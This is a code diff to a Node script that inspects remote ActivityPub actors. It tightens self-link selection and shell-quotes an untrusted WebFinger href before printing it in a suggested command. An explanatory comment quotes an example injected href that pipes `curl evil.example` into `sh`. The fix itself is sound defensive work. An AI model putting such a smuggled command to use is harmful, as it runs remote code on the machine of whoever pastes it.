@@ -38,6 +38,34 @@ async function fetchWithTimeout(url, init) {
   }
 }
 
+// Mirrors fedify-sidecar/src/interop/ap/lib.ts's selectActivityPubSelfLink() exactly (a real
+// `rel=self` ActivityPub self link is application/activity+json, application/ld+json, or
+// typeless — never just "any type containing json", which would also match a generic
+// application/json link that isn't ActivityPub at all). Duplicated rather than imported
+// because this is a plain .mjs meant to run directly with `node`, no build/TS loader assumed;
+// if that constraint changes, import the real one from lib.ts instead of keeping two copies.
+function selectActivityPubSelfLink(links) {
+  if (!Array.isArray(links)) return undefined;
+  for (const link of links) {
+    if (link?.rel !== "self" || typeof link.href !== "string") continue;
+    const type = typeof link.type === "string" ? link.type : "";
+    if (type.includes("application/activity+json") || type.includes("application/ld+json") || type.length === 0) {
+      return link.href;
+    }
+  }
+  return undefined;
+}
+
+// The WebFinger response is untrusted (it's the whole point of inspecting a possibly-hostile
+// or compromised remote server), and this script prints a copy-pasteable "run this next"
+// command containing that response's own href. Never interpolate it unescaped — a href like
+// `https://x.example/$(curl evil.example|sh)` would execute on copy-paste otherwise. POSIX
+// single-quoting neutralizes every shell metacharacter except embedded single quotes, which
+// are escaped by closing the quote, emitting an escaped literal quote, and reopening it.
+function shellQuote(value) {
+  return `'${String(value).replaceAll("'", `'\\''`)}'`;
+}
+
 function printHeaders(headers) {
   const interesting = ["content-type", "date", "location", "cache-control", "vary"];
   for (const name of interesting) {
@@ -82,13 +110,13 @@ async function resolveWebfinger(handle) {
     console.log(`  rel=${link.rel} type=${link.type ?? "(none)"} href=${link.href ?? "(none)"}`);
   }
 
-  const selfLink = (jrd.links ?? []).find(
-    (link) => link.rel === "self" && (link.type ?? "").includes("json"),
-  );
-  if (selfLink?.href) {
-    console.log(`\nActor URL to inspect next:\n  node inspect-remote-object.mjs ${selfLink.href}`);
+  const selfHref = selectActivityPubSelfLink(jrd.links);
+  if (selfHref) {
+    console.log("\nActor URL to inspect next:");
+    console.log(`  ${selfHref}`);
+    console.log(`  node inspect-remote-object.mjs ${shellQuote(selfHref)}`);
   } else {
-    console.log("\nNo self/activity+json link found in the JRD.");
+    console.log("\nNo ActivityPub self link found in the JRD.");
   }
 }
 
